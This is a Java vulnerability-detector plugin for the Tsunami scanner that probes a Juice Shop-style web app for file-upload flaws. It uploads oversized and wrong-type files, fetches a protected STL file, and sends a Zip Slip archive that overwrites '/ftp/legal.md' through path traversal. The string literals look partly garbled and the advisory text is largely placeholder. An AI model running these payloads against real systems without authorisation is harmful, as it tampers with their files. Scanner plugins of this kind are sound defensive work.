/*
 * Copyright 2024 Lukas Pirch
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.raid;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static java.lang.String.format;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.inject.Inject;
import com.google.protobuf.util.Timestamps;
import com.google.protobuf.ByteString;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import com.google.tsunami.common.net.http.HttpHeaders;

import java.io.IOException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.time.Clock;
import java.util.regex.Pattern;
import java.util.regex.Matcher;
import java.util.Random;
import java.io.ByteArrayOutputStream;
import java.util.zip.ZipOutputStream;
import java.util.zip.ZipEntry;

@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "FileuploaddetectorpluginDetector",
    version = "0.1",
    description = "Detects FileUploadDetectorPlugin vulnerability.",
    author = "Joscha, Elena the Debug Dingos",
    bootstrapModule = FileuploaddetectorpluginDetectorBootstrapModule.class)
public final class FileuploaddetectorpluginDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private final HttpClient httpClient;
  private final Clock utcClock;
  private String token = "";

  @Inject
  public FileuploaddetectorpluginDetector(HttpClient httpClient, @UtcClock Clock utcClock) {
    this.httpClient = httpClient;
    this.utcClock = checkNotNull(utcClock);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting detection for Fileuploaddetectorplugin Detector");
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    int successfulAttacks = 0;
    
    try {
        // Test 1: Upload file larger than 100KB (client-side validation bypass)
        if (testLargeFileUpload(targetUri, networkService)) {
            successfulAttacks++;
        }
        
        // Test 2: Upload file without .pdf or .zip extension
        if (testNonPdfFileUpload(targetUri, networkService)) {
            successfulAttacks++;
        }
        
        // Test 3: Zip Slip directory traversal attack
        if (testZipSlipAttack(targetUri, networkService)) {
            successfulAttacks++;
        }
        
        // Test 4: Access unauthorized STL blueprint file
        if (testUnauthorizedFileAccess(targetUri, networkService)) {
            successfulAttacks++;
        }
        
        return successfulAttacks > 0;
    } catch (Exception e) {
        logger.atWarning().log(
            format("File upload vulnerability test failed on '%s': %s", networkService, e.getMessage()));
        return false;
    }
}

private boolean testLargeFileUpload(String targetUri, NetworkService networkService) {
    try {
        // Create a PDF file larger than 100KB but less than 200KB
        byte[] largePdfContent = createLargePdfFile(150 * 1024); // 150KB
        
        String boundary = "----WebKitFormBoundary" + System.currentTimeMillis();
        String formData = "--" + boundary + "\r\
" +
            "Content-Disposition: form-data; name=\"file\"; filename=\"large.pdf\"\r\
" +
            "Content-Type: application/pdf\r\
\r\
";
        
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        baos.write(formData.getBytes(StandardCharsets.UTF_8));
        baos.write(largePdfContent);
        baos.write(("\r\
--" + boundary + "--\r\
").getBytes(StandardCharsets.UTF_8));
        
        HttpHeaders headers = HttpHeaders.builder()
            .addHeader("Content-Type", "multipart/form-data; boundary=" + boundary)
            .build();
        
        HttpResponse response = httpClient.send(
            HttpRequest.post(targetUri + "/file-upload")
                .setHeaders(headers)
                .setRequestBody(ByteString.copyFrom(baos.toByteArray()))
                .build(),
            networkService);
        
        // Success if server accepts the file (status 200 or 204)
        return response.status().code() == 200 || response.status().code() == 204;
    } catch (Exception e) {
        return false;
    }
}

private boolean testNonPdfFileUpload(String targetUri, NetworkService networkService) {
    try {
        // Create a small text file (not PDF or ZIP)
        String textContent = "This is a test file that is not a PDF or ZIP";
        byte[] fileContent = textContent.getBytes(StandardCharsets.UTF_8);
        
        String boundary = "----WebKitFormBoundary" + System.currentTimeMillis();
        String formData = "--" + boundary + "\r\
" +
            "Content-Disposition: form-data; name=\"file\"; filename=\"test.txt\"\r\
" +
            "Content-Type: text/plain\r\
\r\
";
        
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        baos.write(formData.getBytes(StandardCharsets.UTF_8));
        baos.write(fileContent);
        baos.write(("\r\
--" + boundary + "--\r\
").getBytes(StandardCharsets.UTF_8));
        
        HttpHeaders headers = HttpHeaders.builder()
            .addHeader("Content-Type", "multipart/form-data; boundary=" + boundary)
            .build();
        
        HttpResponse response = httpClient.send(
            HttpRequest.post(targetUri + "/file-upload")
                .setHeaders(headers)
                .setRequestBody(ByteString.copyFrom(baos.toByteArray()))
                .build(),
            networkService);
        
        // Success if server returns 204 (no content) as mentioned in vulnerability description
        return response.status().code() == 204;
    } catch (Exception e) {
        return false;
    }
}

private boolean testZipSlipAttack(String targetUri, NetworkService networkService) {
    try {
        // Create a ZIP file with directory traversal path
        ByteArrayOutputStream zipBaos = new ByteArrayOutputStream();
        ZipOutputStream zos = new ZipOutputStream(zipBaos);
        
        // Create entry with directory traversal path
        ZipEntry entry = new ZipEntry("../../ftp/legal.md");
        zos.putNextEntry(entry);
        zos.write("Overwritten legal content".getBytes(StandardCharsets.UTF_8));
        zos.closeEntry();
        zos.close();
        
        byte[] zipContent = zipBaos.toByteArray();
        
        String boundary = "----WebKitFormBoundary" + System.currentTimeMillis();
        String formData = "--" + boundary + "\r\
" +
            "Content-Disposition: form-data; name=\"file\"; filename=\"exploit.zip\"\r\
" +
            "Content-Type: application/zip\r\
\r\
";
        
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        baos.write(formData.getBytes(StandardCharsets.UTF_8));
        baos.write(zipContent);
        baos.write(("\r\
--" + boundary + "--\r\
").getBytes(StandardCharsets.UTF_8));
        
        HttpHeaders headers = HttpHeaders.builder()
            .addHeader("Content-Type", "multipart/form-data; boundary=" + boundary)
            .build();
        
        HttpResponse response = httpClient.send(
            HttpRequest.post(targetUri + "/file-upload")
                .setHeaders(headers)
                .setRequestBody(ByteString.copyFrom(baos.toByteArray()))
                .build(),
            networkService);
        
        // Check if upload was successful and then verify if legal.md was overwritten
        if (response.status().code() == 200 || response.status().code() == 204) {
            // Try to access the legal.md file to see if it was overwritten
            HttpResponse legalResponse = httpClient.send(
                HttpRequest.get(targetUri + "/ftp/legal.md").build(),
                networkService);
            
            if (legalResponse.status().code() == 200) {
                String content = legalResponse.bodyBytes()
                    .map(bs -> bs.toStringUtf8())
                    .orElse("");
                return content.contains("Overwritten legal content");
            }
        }
        
        return false;
    } catch (Exception e) {
        return false;
    }
}

private boolean testUnauthorizedFileAccess(String targetUri, NetworkService networkService) {
    try {
        // Try to access the STL blueprint file
        HttpResponse response = httpClient.send(
            HttpRequest.get(targetUri + "/assets/public/images/products/JuiceShop.stl").build(),
            networkService);
        
        // Success if we can access the STL file (should be protected)
        return response.status().code() == 200;
    } catch (Exception e) {
        return false;
    }
}

private byte[] createLargePdfFile(int sizeInBytes) {
    // Create a simple PDF-like structure with specified size
    StringBuilder pdfContent = new StringBuilder();
    pdfContent.append("%PDF-1.4\
");
    pdfContent.append("1 0 obj\
<< /Type /Catalog /Pages 2 0 R >>\
endobj\
");
    pdfContent.append("2 0 obj\
<< /Type /Pages /Kids [3 0 R] /Count 1 >>\
endobj\
");
    pdfContent.append("3 0 obj\
<< /Type /Page /Parent 2 0 R /Contents 4 0 R >>\
endobj\
");
    pdfContent.append("4 0 obj\
<< /Length ");
    
    // Calculate remaining bytes needed
    int currentSize = pdfContent.toString().getBytes(StandardCharsets.UTF_8).length;
    int remainingBytes = sizeInBytes - currentSize - 100; // Leave some buffer for closing tags
    
    pdfContent.append(" ").append(remainingBytes).append(" >>\
stream\
");
    
    // Fill with dummy content to reach desired size
    Random random = new Random();
    for (int i = 0; i < remainingBytes; i++) {
        pdfContent.append((char) (65 + random.nextInt(26))); // Random A-Z
    }
    
    pdfContent.append("\
endstream\
endobj\
");
    pdfContent.append("xref\
0 5\
0000000000 65535 f\
");
    pdfContent.append("trailer\
<< /Size 5 /Root 1 0 R >>\
startxref\
");
    pdfContent.append(pdfContent.length() - 50);
    pdfContent.append("\
%%EOF");
    
    return pdfContent.toString().getBytes(StandardCharsets.UTF_8);
}

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(
            Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("FILEUPLOADDETECTORPLUGIN_VULNERABILITY"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("FileUploadDetectorPlugin Vulnerability Exposed")
                .setDescription("The application is vulnerable to FileUploadDetectorPlugin attacks.")
                .setRecommendation(
                    "Implement server-side file validation, restrict file types and sizes, sanitize file names, validate zip contents to prevent directory traversal, and secure file storage locations"))
        .build();
  }
  
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("FILEUPLOADDETECTORPLUGIN_VULNERABILITY"))
            .setSeverity(Severity.CRITICAL)
            .setTitle("FileUploadDetectorPlugin Vulnerability Exposed")
            .setDescription(
                "The application is vulnerable to FileUploadDetectorPlugin attacks.")
            .setRecommendation(
                "Implement server-side file validation, restrict file types and sizes, sanitize file names, validate zip contents to prevent directory traversal, and secure file storage locations")
        .build());
  }
}